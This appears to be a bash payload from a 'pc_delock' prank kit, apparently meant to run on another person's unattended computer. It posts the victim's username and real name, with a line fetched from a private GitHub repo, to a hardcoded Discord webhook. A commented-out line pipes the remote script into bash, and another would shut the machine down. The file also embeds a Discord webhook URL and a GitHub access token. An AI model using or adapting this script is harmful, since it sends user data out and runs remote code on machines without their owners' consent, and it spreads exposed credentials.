#!/bin/bash

WEBHOOK_URL="https://discord.com/api/webhooks/885173629606834196/Lp9N3Wr86xcgRj2HzI9iOaMMql4Y5pL6iBdX-gQmFC2QhxrpXzuM4tSi6r4TIOJ9wXkA"
rdm=$(( $RANDOM % 15 ))

wget -q --spider http://google.com

if [ $? -eq 0 ]; then
	#curl -s -H 'Authorization: token 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' "https://raw.githubusercontent.com/Waz0x/pc_delock_keur/master/scripts/$rdm.sh" | bash
	curl \
	  -H "Content-Type: application/json" \
	  -d "{\"username\": \"Ducky\", \"content\":null,\"embeds\":[{\"title\":\"Script n°$rdm\", \"description\": \"$(curl -s -H 'Authorization: token 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' "https://raw.githubusercontent.com/Waz0x/pc_delock_keur/master/scripts/$rdm.sh" | sed '2q;d')\", \"url\":\"https://github.com/Waz0x/pc_delock/blob/master/scripts/$rdm.sh\",\"color\":13704477,\"author\":{\"name\":\"$USER | $NAME\"},\"footer\":{\"text\":\"R.I.P.\"}}]}" $WEBHOOK_URL
else
	echo "yes"
	#shutdown now
fi
